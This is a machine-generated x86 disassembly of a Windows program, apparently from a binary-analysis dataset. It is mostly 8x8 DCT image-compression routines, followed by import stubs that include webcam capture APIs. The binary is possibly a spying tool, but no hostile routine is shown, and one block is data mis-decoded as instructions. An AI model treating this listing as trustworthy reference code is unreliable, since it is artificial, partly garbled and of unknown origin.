mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0x14 ]
fld [ ebp - 0x4c ]
fsub [ ebp - 0x38 ]
mov edx [ ebp - 0x50 ]
fstp [ edx + 0xc ]
fld [ ebp - 0x48 ]
fadd [ ebp - 0x40 ]
mov eax [ ebp - 0x50 ]
fstp [ eax + 0x4 ]
fld [ ebp - 0x48 ]
fsub [ ebp - 0x40 ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0x1c ]
mov edx [ ebp - 0x50 ]
add edx 0x20
mov [ ebp - 0x50 ] edx
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x54 ]
sub ecx 0x1
mov [ ebp - 0x54 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx ]
fadd [ eax + 0xe0 ]
fstp [ ebp - 0x4 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx ]
fsub [ edx + 0xe0 ]
fstp [ ebp - 0x20 ]
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
fld [ eax + 0x20 ]
fadd [ ecx + 0xc0 ]
fstp [ ebp - 0x8 ]
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx + 0x20 ]
fsub [ eax + 0xc0 ]
fstp [ ebp - 0x1c ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx + 0x40 ]
fadd [ edx + 0xa0 ]
fstp [ ebp - 0xc ]
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x50 ]
fld [ eax + 0x40 ]
fsub [ ecx + 0xa0 ]
fstp [ ebp - 0x18 ]
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
fld [ edx + 0x60 ]
fadd [ eax + 0x80 ]
fstp [ ebp - 0x10 ]
mov ecx [ ebp - 0x50 ]
mov edx [ ebp - 0x50 ]
fld [ ecx + 0x60 ]
fsub [ edx + 0x80 ]
fstp [ ebp - 0x14 ]
fld [ ebp - 0x4 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ebp - 0x4 ]
fsub [ ebp - 0x10 ]
fstp [ ebp - 0x30 ]
fld [ ebp - 0x8 ]
fadd [ ebp - 0xc ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x8 ]
fsub [ ebp - 0xc ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fadd [ ebp - 0x28 ]
mov eax [ ebp - 0x50 ]
fstp [ eax ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x28 ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0x80 ]
fld [ ebp - 0x2c ]
fadd [ ebp - 0x30 ]
fmul [ r--data ]
fstp [ ebp - 0x34 ]
fld [ ebp - 0x30 ]
fadd [ ebp - 0x34 ]
mov edx [ ebp - 0x50 ]
fstp [ edx + 0x40 ]
fld [ ebp - 0x30 ]
fsub [ ebp - 0x34 ]
mov eax [ ebp - 0x50 ]
fstp [ eax + 0xc0 ]
fld [ ebp - 0x14 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x24 ]
fld [ ebp - 0x18 ]
fadd [ ebp - 0x1c ]
fstp [ ebp - 0x28 ]
fld [ ebp - 0x1c ]
fadd [ ebp - 0x20 ]
fstp [ ebp - 0x2c ]
fld [ ebp - 0x24 ]
fsub [ ebp - 0x2c ]
fmul [ r--data ]
fstp [ ebp - 0x44 ]
fld [ r--data ]
fmul [ ebp - 0x24 ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x38 ]
fld [ r--data ]
fmul [ ebp - 0x2c ]
fadd [ ebp - 0x44 ]
fstp [ ebp - 0x40 ]
fld [ ebp - 0x28 ]
fmul [ r--data ]
fstp [ ebp - 0x3c ]
fld [ ebp - 0x20 ]
fadd [ ebp - 0x3c ]
fstp [ ebp - 0x48 ]
fld [ ebp - 0x20 ]
fsub [ ebp - 0x3c ]
fst [ ebp - 0x4c ]
fadd [ ebp - 0x38 ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0xa0 ]
fld [ ebp - 0x4c ]
fsub [ ebp - 0x38 ]
mov edx [ ebp - 0x50 ]
fstp [ edx + 0x60 ]
fld [ ebp - 0x48 ]
fadd [ ebp - 0x40 ]
mov eax [ ebp - 0x50 ]
fstp [ eax + 0x20 ]
fld [ ebp - 0x48 ]
fsub [ ebp - 0x40 ]
mov ecx [ ebp - 0x50 ]
fstp [ ecx + 0xe0 ]
mov edx [ ebp - 0x50 ]
add edx 0x4
mov [ ebp - 0x50 ] edx
jmp r-xdata
mov ecx [ ebp - 0x54 ]
sub ecx 0x1
mov [ ebp - 0x54 ] ecx
sub_434360
push ebp
mov ebp esp
sub esp 0x94
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x54 ] 0x7
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x54 ] 0x7
jmp r-xdata
mov edx [ ebp - 0x50 ]
mov eax [ edx ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0x1c ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx ]
sub ecx [ eax + 0x1c ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0x4 ]
sub ecx [ eax + 0x18 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0x14 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0x8 ]
sub ecx [ eax + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0xc ]
sub ecx [ eax + 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx ] eax
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x28 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0x10 ] edx
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x30 ]
imul ecx ecx 0xb5
sar ecx 0x8
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x34 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0x8 ] edx
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x50 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x20 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x2c ]
imul eax eax 0x62
sar eax 0x8
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x8b
sar ecx 0x8
add ecx [ ebp - 0x44 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x2c ]
imul edx edx 0x14e
sar edx 0x8
add edx [ ebp - 0x44 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x28 ]
imul eax eax 0xb5
sar eax 0x8
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x3c ]
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x3c ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x4c ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp - 0x4c ]
sub edx [ ebp - 0x38 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp - 0x48 ]
add ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x50 ]
mov [ edx + 0x4 ] ecx
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp - 0x50 ]
add edx 0x20
mov [ ebp - 0x50 ] edx
jmp r-xdata
cmp [ ebp - 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x54 ]
sub ecx 0x1
mov [ ebp - 0x54 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x50 ]
mov eax [ edx ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0xe0 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx ]
sub ecx [ eax + 0xe0 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0x20 ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0xc0 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0x20 ]
sub ecx [ eax + 0xc0 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0xa0 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0x40 ]
sub ecx [ eax + 0xa0 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x50 ]
mov eax [ edx + 0x60 ]
mov ecx [ ebp - 0x50 ]
add eax [ ecx + 0x80 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x50 ]
mov eax [ ebp - 0x50 ]
mov ecx [ edx + 0x60 ]
sub ecx [ eax + 0x80 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx ] eax
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x28 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0x80 ] edx
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x30 ]
imul ecx ecx 0xb5
sar ecx 0x8
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x34 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x50 ]
mov [ edx + 0xc0 ] ecx
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x18 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x1c ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x20 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x2c ]
imul eax eax 0x62
sar eax 0x8
mov [ ebp - 0x44 ] eax
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x8b
sar ecx 0x8
add ecx [ ebp - 0x44 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x2c ]
imul edx edx 0x14e
sar edx 0x8
add edx [ ebp - 0x44 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x28 ]
imul eax eax 0xb5
sar eax 0x8
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x3c ]
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x3c ]
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x4c ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx + 0xa0 ] eax
mov edx [ ebp - 0x4c ]
sub edx [ ebp - 0x38 ]
mov eax [ ebp - 0x50 ]
mov [ eax + 0x60 ] edx
mov ecx [ ebp - 0x48 ]
add ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x50 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x50 ]
mov [ ecx + 0xe0 ] eax
mov edx [ ebp - 0x50 ]
add edx 0x4
mov [ ebp - 0x50 ] edx
jmp r-xdata
mov ecx [ ebp - 0x54 ]
sub ecx 0x1
mov [ ebp - 0x54 ] ecx
sub_4346f0
push ebp
mov ebp esp
sub esp 0x8c
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4c ] 0x7
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4c ] 0x7
jmp r-xdata
mov edx [ ebp - 0x48 ]
mov eax [ edx ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0x1c ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx ]
sub ecx [ eax + 0x1c ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x48 ]
mov eax [ edx + 0x4 ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx + 0x4 ]
sub ecx [ eax + 0x18 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x48 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0x14 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx + 0x8 ]
sub ecx [ eax + 0x14 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x48 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx + 0xc ]
sub ecx [ eax + 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
shl eax 0x2
mov ecx [ ebp - 0x48 ]
mov [ ecx ] eax
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x28 ]
shl edx 0x2
mov eax [ ebp - 0x48 ]
mov [ eax + 0x10 ] edx
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x30 ]
imul ecx ecx 0x1151
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x30 ]
imul edx edx 0x187e
mov eax [ ebp - 0x34 ]
lea ecx [ eax + edx + 0x400 ]
sar ecx 0xb
mov edx [ ebp - 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ ebp - 0x2c ]
imul eax eax 0xffffc4df
mov ecx [ ebp - 0x34 ]
lea edx [ ecx + eax + 0x400 ]
sar edx 0xb
mov eax [ ebp - 0x48 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x20 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x18 ]
add edx [ ebp - 0x1c ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x1c ]
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x20 ]
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x3c ]
add edx [ ebp - 0x40 ]
imul edx edx 0x25a1
mov [ ebp - 0x44 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x98e
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x18 ]
imul ecx ecx 0x41b3
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x1c ]
imul edx edx 0x6254
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x20 ]
imul eax eax 0x300b
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x34 ]
imul ecx ecx 0xffffe333
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x38 ]
imul edx edx 0xffffadfd
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x3c ]
imul eax eax 0xffffc13b
mov [ ebp - 0x3c ] eax
mov ecx [ ebp - 0x40 ]
imul ecx ecx 0xfffff384
mov [ ebp - 0x40 ] ecx
mov edx [ ebp - 0x3c ]
add edx [ ebp - 0x44 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x40 ]
add eax [ ebp - 0x44 ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
lea eax [ ecx + edx + 0x400 ]
sar eax 0xb
mov ecx [ ebp - 0x48 ]
mov [ ecx + 0x1c ] eax
mov edx [ ebp - 0x18 ]
add edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
lea ecx [ edx + eax + 0x400 ]
sar ecx 0xb
mov edx [ ebp - 0x48 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x3c ]
lea edx [ eax + ecx + 0x400 ]
sar edx 0xb
mov eax [ ebp - 0x48 ]
mov [ eax + 0xc ] edx
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x40 ]
lea eax [ ecx + edx + 0x400 ]
sar eax 0xb
mov ecx [ ebp - 0x48 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x48 ]
add edx 0x20
mov [ ebp - 0x48 ] edx
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
jl r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx 0x1
mov [ ebp - 0x4c ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x48 ]
mov eax [ edx ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0xe0 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx ]
sub ecx [ eax + 0xe0 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x48 ]
mov eax [ edx + 0x20 ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0xc0 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx + 0x20 ]
sub ecx [ eax + 0xc0 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x48 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0xa0 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx + 0x40 ]
sub ecx [ eax + 0xa0 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x48 ]
mov eax [ edx + 0x60 ]
mov ecx [ ebp - 0x48 ]
add eax [ ecx + 0x80 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x48 ]
mov ecx [ edx + 0x60 ]
sub ecx [ eax + 0x80 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0x10 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0xc ]
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax + 0x2 ]
sar edx 0x2
mov eax [ ebp - 0x48 ]
mov [ eax ] edx
mov ecx [ ebp - 0x24 ]
sub ecx [ ebp - 0x28 ]
add ecx 0x2
sar ecx 0x2
mov edx [ ebp - 0x48 ]
mov [ edx + 0x80 ] ecx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x30 ]
imul eax eax 0x1151
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x30 ]
imul ecx ecx 0x187e
mov edx [ ebp - 0x34 ]
lea eax [ edx + ecx + 0x4000 ]
sar eax 0xf
mov ecx [ ebp - 0x48 ]
mov [ ecx + 0x40 ] eax
mov edx [ ebp - 0x2c ]
imul edx edx 0xffffc4df
mov eax [ ebp - 0x34 ]
lea ecx [ eax + edx + 0x4000 ]
sar ecx 0xf
mov edx [ ebp - 0x48 ]
mov [ edx + 0xc0 ] ecx
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x1c ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x1c ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x3c ]
add ecx [ ebp - 0x40 ]
imul ecx ecx 0x25a1
mov [ ebp - 0x44 ] ecx
mov edx [ ebp - 0x14 ]
imul edx edx 0x98e
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x18 ]
imul eax eax 0x41b3
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x1c ]
imul ecx ecx 0x6254
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
imul edx edx 0x300b
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x34 ]
imul eax eax 0xffffe333
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x38 ]
imul ecx ecx 0xffffadfd
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x3c ]
imul edx edx 0xffffc13b
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x40 ]
imul eax eax 0xfffff384
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x3c ]
add ecx [ ebp - 0x44 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp - 0x40 ]
add edx [ ebp - 0x44 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x14 ]
add eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
lea edx [ eax + ecx + 0x4000 ]
sar edx 0xf
mov eax [ ebp - 0x48 ]
mov [ eax + 0xe0 ] edx
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x40 ]
lea eax [ ecx + edx + 0x4000 ]
sar eax 0xf
mov ecx [ ebp - 0x48 ]
mov [ ecx + 0xa0 ] eax
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x38 ]
mov eax [ ebp - 0x3c ]
lea ecx [ edx + eax + 0x4000 ]
sar ecx 0xf
mov edx [ ebp - 0x48 ]
mov [ edx + 0x60 ] ecx
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx + 0x4000 ]
sar edx 0xf
mov eax [ ebp - 0x48 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x48 ]
add ecx 0x4
mov [ ebp - 0x48 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx 0x1
mov [ ebp - 0x4c ] ecx
sub_402650
push ebp
mov ebp esp
sub esp 0x94
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x94 ] 0x94
push eax
call [ GetVersionExA@IAT ]
xor eax eax
cmp [ ebp - 0x84 ] 0x2
sete al
leave
retn
sub_404173
push esi
push 0x0
push [ esp + 0xc ]
call sub_404213
mov esi eax
push esi
call strlen
add esp 0xc
mov [ rw-data ] eax
mov eax esi
pop esi
retn
sub_404193
push esi
push 0x1
push [ esp + 0xc ]
call sub_404213
mov esi eax
push esi
call strlen
add esp 0xc
mov [ rw-data ] eax
mov eax esi
pop esi
retn
sub_4041b3
push esi
push 0x2
push [ esp + 0xc ]
call sub_404213
mov esi eax
push esi
call strlen
add esp 0xc
mov [ rw-data ] eax
mov eax esi
pop esi
retn
sub_4041d3
push esi
push 0x3
push [ esp + 0xc ]
call sub_404213
mov esi eax
push esi
call strlen
add esp 0xc
mov [ rw-data ] eax
mov eax esi
pop esi
retn
sub_4041f3
push esi
push 0x4
push [ esp + 0xc ]
call sub_404213
mov esi eax
push esi
call strlen
add esp 0xc
mov [ rw-data ] eax
mov eax esi
pop esi
retn
sub_407147
push esi
push [ rw-data ]
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_407c36
push esi
push rw-data
call _strdup
mov esi eax
push esi
call strlen
pop ecx
mov [ rw-data ] eax
pop ecx
mov eax esi
pop esi
retn
sub_407cea
push 0x2
call [ ExitProcess@IAT ]
sub_408bb6
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
mov [ rw-data ] eax
retn
sub_408bc7
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
retn
sub_40b835
push esi
mov esi ecx
call sub_40b851
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_40b87f
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_414dd7
add [ edx ] al
add al [ edx ]
add [ edx ] eax
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add al [ edx ]
add esp ecx
int3
capCreateCaptureWindowA
jmp [ capCreateCaptureWindowA@IAT ]
capGetDriverDescriptionA
jmp [ capGetDriverDescriptionA@IAT ]
rand
jmp [ rand@IAT ]
strncmp
jmp [ strncmp@IAT ]
exit
jmp [ exit@IAT ]
strstr
jmp [ strstr@IAT ]
strcat
jmp [ strcat@IAT ]
free
jmp [ free@IAT ]
malloc
jmp [ malloc@IAT ]
_snprintf
jmp [ _snprintf@IAT ]
fclose
jmp [ fclose@IAT ]
_filbuf
jmp [ _filbuf@IAT ]
fopen
jmp [ fopen@IAT ]
_sleep
jmp [ _sleep@IAT ]
atoi
jmp [ atoi@IAT ]
sprintf
jmp [ sprintf@IAT ]
strncpy
jmp [ strncpy@IAT ]
strlen
jmp [ strlen@IAT ]
strrchr
jmp [ strrchr@IAT ]
_strnicmp
jmp [ _strnicmp@IAT ]
strcmp
jmp [ strcmp@IAT ]
realloc
jmp [ realloc@IAT ]
strtok
jmp [ strtok@IAT ]
fread
jmp [ fread@IAT ]
strcpy
jmp [ strcpy@IAT ]
fflush
jmp [ fflush@IAT ]
fwrite
jmp [ fwrite@IAT ]
_filelength
jmp [ _filelength@IAT ]
fprintf
jmp [ fprintf@IAT ]
fgetwc
jmp [ fgetwc@IAT ]
_msize
jmp [ _msize@IAT ]
_strlwr
jmp [ _strlwr@IAT ]
remove
jmp [ remove@IAT ]
printf
jmp [ printf@IAT ]
strncat
jmp [ strncat@IAT ]
atol
jmp [ atol@IAT ]
fseek
jmp [ fseek@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
memcmp
jmp [ memcmp@IAT ]
mbstowcs
